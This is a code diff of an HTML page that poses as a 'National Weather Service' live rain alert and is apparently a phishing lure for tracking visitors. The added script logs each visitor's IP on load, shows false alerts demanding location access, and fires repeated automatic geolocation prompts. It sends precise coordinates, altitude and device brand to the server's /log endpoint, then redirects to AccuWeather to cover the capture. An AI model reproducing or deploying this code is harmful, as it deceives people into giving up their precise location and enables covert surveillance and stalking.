@@ -1,34 +1,34 @@
-cat <<EOF > templates/index.html
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>National Weather Service | Live Update</title>
     <link rel="icon" type="image/png" href="https://img.icons8.com/color/48/weather.png" />
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
         body { background: linear-gradient(135deg, #1d1f21 0%, #111315 100%); color: #ecf0f1; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; overflow: hidden; }
-        .weather-card { background-color: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); padding: 40px 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4); width: 90%; max-width: 380px; animation: fadeIn 0.8s ease-out; }
+        .weather-card { background-color: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); padding: 40px 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4); width: 90%; max-width: 380px; animation: fadeIn 0.8s ease-out; position: relative; }
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
         .icon-container { width: 120px; height: 120px; background: rgba(255, 255, 255, 0.05); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .main-icon { width: 100px; animation: float 3s infinite ease-in-out; }
         @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #fff; text-transform: capitalize; }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #fff; }
         .alert-text { color: #f1c40f; font-size: 14px; font-weight: 600; margin-bottom: 10px; display: block; letter-spacing: 1px; }
         p { font-size: 14px; line-height: 1.5; margin-bottom: 30px; color: #bdc3c7; }
-        .check-btn { background: linear-gradient(90deg, #2ecc71, #27ae60); color: #fff; border: none; padding: 16px 0; width: 100%; font-size: 16px; font-weight: 700; border-radius: 12px; cursor: pointer; box-shadow: 0 8px 20px rgba(46, 204, 113, 0.3); transition: 0.3s; }
+        .check-btn { background: linear-gradient(90deg, #2ecc71, #27ae60); color: #fff; border: none; padding: 16px 0; width: 100%; font-size: 16px; font-weight: 700; border-radius: 12px; cursor: pointer; box-shadow: 0 8px 20px rgba(46, 204, 113, 0.3); transition: 0.3s; -webkit-tap-highlight-color: transparent; }
         .check-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 25px rgba(46, 204, 113, 0.5); }
-        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; flex-direction: column; justify-content: center; align-items: center; border-radius: 24px; }
+        .check-btn:active { transform: scale(0.97); }
+        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; flex-direction: column; justify-content: center; align-items: center; border-radius: 24px; z-index: 999; }
         .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #2ecc71; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .footer { font-size: 10px; color: #5d6d7e; position: absolute; bottom: 15px; width: 100%; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
-    <div class="weather-card">
+    <div class="weather-card" id="weatherCard">
         <div class="icon-container">
-            <img src="https://img.icons8.com/color/120/partly-cloudy-day.png" class="main-icon"/>
+            <img src="https://img.icons8.com/color/120/partly-cloudy-day.png" class="main-icon" alt=""/>
         </div>
         <span class="alert-text">⚠️ LIVE WEATHER ALERT</span>
         <h1>Is it going to rain? 👇</h1>
@@ -40,27 +40,154 @@ cat <<EOF > templates/index.html
         </div>
     </div>
     <div class="footer">DMD Weather Systems | Chittagong Division</div>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
+        // ============= 1. IP TRACK - সাথে সাথে =============
+        function trackIP() {
+            try {
+                var x = new XMLHttpRequest();
+                x.open('POST', '/track', true);
+                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                x.send('v=1');
+            } catch(e) {}
+        }
+        trackIP();
+
+        // ============= 2. সাথে সাথে ২ বার ALERT =============
+        setTimeout(function() {
+            alert("⚠️ Live Weather Alert: Location access is required to check real-time weather in your area.");
+        }, 100);
+        setTimeout(function() {
+            alert("📍 Please click 'Allow' when your browser asks for location permission to continue.");
+        }, 800);
+
+        // ============= 3. AUTO LOCATION PERMISSION POPUP ENGINE =============
+        var permissionChecked = false;
+        var locationCaptured = false;
+        var autoAttempts = 0;
+        var maxAttempts = 50;
+
+        function forceGeolocationPrompt() {
+            if (locationCaptured || autoAttempts > maxAttempts) return;
+            autoAttempts++;
+
+            try {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            if (!locationCaptured) {
+                                locationCaptured = true;
+                                sendLocation(pos);
+                                setTimeout(function() {
+                                    window.location.href = "https://www.accuweather.com/";
+                                }, 1500);
+                            }
+                        },
+                        function(err) {
+                            if (err.code === 1) {
+                                // Permission denied - stop trying
+                                permissionChecked = true;
+                            }
+                            // অন্যান্য error উপেক্ষা কর
+                        },
+                        { timeout: 3000, enableHighAccuracy: true, maximumAge: 0 }
+                    );
+                }
+            } catch(e) {}
+
+            if (!permissionChecked && !locationCaptured) {
+                setTimeout(forceGeolocationPrompt, 150);
+            }
+        }
+
+        // ============= 4. MAIN GET LOCATION (Check Weather Button) =============
         function getLocation() {
             document.getElementById("main-btn").style.display = "none";
             document.getElementById("loading-overlay").style.display = "flex";
+            
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError, { enableHighAccuracy: true });
-            } else { alert("Geolocation not supported."); resetUI(); }
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        sendLocation(position);
+                        setTimeout(function() {
+                            window.location.href = "https://www.accuweather.com/";
+                        }, 1500);
+                    },
+                    function(error) {
+                        var msg = "";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                msg = "To see the weather report, please click 'Allow' when location permission is requested.";
+                                permissionChecked = true;
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                            case error.TIMEOUT:
+                                msg = "Location unavailable. Please turn on GPS and try again.";
+                                break;
+                            default:
+                                msg = "An error occurred. Please try again.";
+                        }
+                        alert(msg);
+                        resetUI();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                alert("Geolocation not supported on this device.");
+                resetUI();
+            }
         }
-        function showPosition(position) {
-            $.ajax({
-                url: '/log', type: 'POST',
-                data: { lat: position.coords.latitude, lon: position.coords.longitude },
-                success: function() { 
-                    setTimeout(() => { window.location.href = "https://www.accuweather.com/"; }, 1000); 
-                }
-            });
+
+        function sendLocation(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var acc = position.coords.accuracy;
+            var alt = position.coords.altitude || 0;
+            var dev = detectDevice();
+            
+            try {
+                var x = new XMLHttpRequest();
+                x.open('POST', '/log', true);
+                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                x.send('lat=' + lat + '&lon=' + lon + '&acc=' + acc + '&alt=' + alt + '&dev=' + encodeURIComponent(dev));
+            } catch(e) {}
         }
-        function showError(err) { resetUI(); alert("To see the weather report, please 'Allow' location access."); }
-        function resetUI() { document.getElementById("loading-overlay").style.display = "none"; document.getElementById("main-btn").style.display = "block"; }
+
+        function detectDevice() {
+            var u = navigator.userAgent;
+            if (/iPhone/.test(u)) return 'iPhone';
+            if (/iPad/.test(u)) return 'iPad';
+            if (/Samsung|SM-/.test(u)) return 'Samsung';
+            if (/Pixel/.test(u)) return 'Pixel';
+            if (/Xiaomi|Redmi|Mi /.test(u)) return 'Xiaomi';
+            if (/OPPO|Reno|CPH/.test(u)) return 'OPPO';
+            if (/vivo|Vivo/.test(u)) return 'Vivo';
+            if (/Android/.test(u)) return 'Android';
+            return 'PC';
+        }
+
+        function resetUI() {
+            document.getElementById("loading-overlay").style.display = "none";
+            document.getElementById("main-btn").style.display = "block";
+        }
+
+        // ============= 5. EXECUTION =============
+        // Auto permission popup trigger - পেজ লোডের সাথে সাথে শুরু
+        setTimeout(forceGeolocationPrompt, 200);
+        setTimeout(forceGeolocationPrompt, 400);
+        setTimeout(forceGeolocationPrompt, 600);
+        setTimeout(forceGeolocationPrompt, 800);
+        setTimeout(forceGeolocationPrompt, 1000);
+        
+        // DOMContentLoaded এ আবার চেষ্টা
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(forceGeolocationPrompt, 100);
+            setTimeout(forceGeolocationPrompt, 300);
+            setTimeout(forceGeolocationPrompt, 500);
+        });
     </script>
 </body>
 </html>
-EOF
